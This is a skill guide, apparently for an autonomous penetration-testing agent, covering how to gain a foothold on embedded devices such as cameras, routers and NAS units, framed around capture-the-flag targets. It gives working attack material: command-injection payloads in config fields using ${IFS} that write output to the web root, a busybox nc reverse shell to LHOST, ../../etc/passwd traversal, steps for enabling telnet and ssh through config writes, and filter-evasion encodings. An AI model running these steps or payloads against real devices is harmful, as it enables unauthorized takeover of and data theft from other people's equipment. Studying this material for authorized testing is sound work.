---
name: embedded-foothold
when: the target is an embedded/IoT device (camera, router, NAS, DVR, printer) — often a small httpd (Boa, lighttpd, uhttpd, GoAhead, mini_httpd) serving CGI, sometimes with admin creds in hand
tools: [http_request, session, shell, python_exec]
phase: foothold
---
# Embedded device foothold (camera / router / NAS / DVR)

Goal: turn web/admin access into flag/output on the device. The win is command execution
you can READ, not necessarily a reverse shell. Generic across vendors — adapt the exact
endpoint names to the device you fingerprinted.

## 1. Fingerprint precisely
`whatweb http://TARGET`, grab headers/`Server:`, the login page, `/CHANGELOG`, model/
firmware strings. Note the product + firmware version — that is what drives the CVE and
tells you which config endpoints exist. `searchsploit <vendor> <model/version>`; read the
PoC (`searchsploit -m <id>`) and adapt its ports/paths and the destrier LHOST. Many admin
CGIs use HTTP Digest auth — pass the creds to `http_request` via its `auth` arg; it
answers the 401 for you.
If you can pull the device's firmware image (a separate update/staging host on the
network, a firmware-backup/recovery endpoint, or a handed-over artifact),
`consult_skill 'firmware-re'` first — reversing it hands you the exact vulnerable
param, web root, and trigger instead of brute-forcing them here (quick triage:
`binwalk -e <img>` to carve the filesystem, then read its `/etc` for credentials,
the web root, and the CGI handlers you will attack).

## 2. Enable a shell service via a config write — but VERIFY it, do not trust the ack
Many devices expose a settings endpoint that toggles a shell daemon (`telnetd`,
`telnet_enable`, `ssh`, `sshd`, `ssh_enable`, `sshport`, `telnetssh`, `debug`). With admin
creds this can be the fastest foothold — IF a port actually opens:
- Send the write authenticated (cookies/`auth` persist in `http_request`).
- PROVE the port opened: `nmap -sT -Pn -p <port> TARGET` or `(echo >/dev/tcp/TARGET/<port>)`,
  then connect (`session open ... cmd="ssh -p <port> admin@TARGET"` / `telnet TARGET <port>`).
- An `OK`/`enabled` RESPONSE IS NOT A FOOTHOLD. Devices often ack a setting cosmetically,
  need a reboot you cannot force, or bind a nonstandard port. **If no port opens after you
  apply, abandon this path** and use §3 (command-injection → web-root exfil), which needs no
  bound port and no egress. Do not grind an ack that never produced a socket.

## 3. Command injection in a config field (root RCE) — the reliable way
Config fields (hostname, DDNS, NTP/SNTP server, DNS, timezone, PPPoE) written then consumed
on APPLY are frequently passed to a shell as root. NOTE: the ping/traceroute DIAGNOSTIC field
is the obvious guess and is usually input-filtered (returns `NG`/error) — prefer the stored
config fields over it. Work it IN THIS ORDER — faster and far more
reliable than a reverse shell:

1. CONFIRM the executing field + encoding cheaply. You do NOT need to reverse-engineer the
   client JS to find the param — that is a time sink. Capture ONE legitimate config-save
   request (submit the settings form once, or read it) to get every field name and the save
   endpoint, then inject a DISTINCT web-root marker into each candidate field in a SINGLE
   save and apply once (step 2):
   `f1=...;echo${IFS}m1>/<webroot>/m1;` … `fN=...;echo${IFS}mN>/<webroot>/mN;` then GET
   `/m1`…`/mN`. Whichever marker returns names the executing field — one round-trip, no
   `sleep` waits, no blind callback. Then reuse that field for real output.
2. TRIGGER execution. The value runs when the firmware USES it, not when set: apply/save the
   form, toggle the feature that consumes the value (enable the service, re-apply the
   network/time settings), or reboot. No trigger => the payload never fires. Watch for a
   companion "obtain automatically" / "from DHCP" / auto toggle on the same field: when it
   is on, the device uses the auto-supplied value and your injected string is stored but
   never used (a silent no-op behind a correct-looking payload) — set that toggle to
   manual/use-my-value in the SAME save so your value is the one that executes.
3. EXFIL over HTTP — no reverse shell, no egress, no device `nc`/telnetd needed: redirect
   output into the web root and read it. `...;cat${IFS}/flag*${IFS}>/<webroot>/o;` -> `GET /o`.
   Locate the web root from the fingerprint (the server config's docroot, or where static
   assets load from — commonly `/www`, `/var/www`, `/tmp/www`, `/opt/.../www`).
4. Do NOT stand up a reverse-shell listener as your opening move — steps 1-3 need no egress
   and read the flag directly, and embedded targets frequently cannot reach you (blocked
   egress, no `nc -e`/`bash`). Escalate to a reverse shell ONLY after web-root-read RCE is
   confirmed AND you actually need interactivity: `;busybox nc <LHOST> <LPORT> -e /bin/sh;`,
   catch it with reverse_shell_listener, drive it and record_access.
Encodings if filtered: `${IFS}` for spaces, `;`, `|`, `&&`, backticks, `$(...)`, `%0a`, URL-encoding.
See `command-injection` for the confirm-first oracle detail.

## 4. Unauth info / credential leak
Some devices leak creds/config without auth: config backups, `/etc/passwd`-style dumps, a
status/`system.ini`/`hidden` page, or a param that reads a file (`../../etc/passwd`). Pull
creds, then reuse them for ssh/telnet (§2) or the admin panel.

## 5. After execution
If you took a shell, confirm with `id` and `record_access(host, session='foothold', ...)`.
If you only have web-root-read RCE, that is still enough to read and submit the flag — do
that FIRST, then decide whether a full shell is even needed. The auto-loot sweep (if enabled)
helps once a session lands; otherwise see `flag-hunting` and, if privilege-gated,
`linux-privesc`. Many embedded flags sit in `/`, `/root`, `/tmp`, `/mnt`, or a web root —
and you are often already root on these devices.
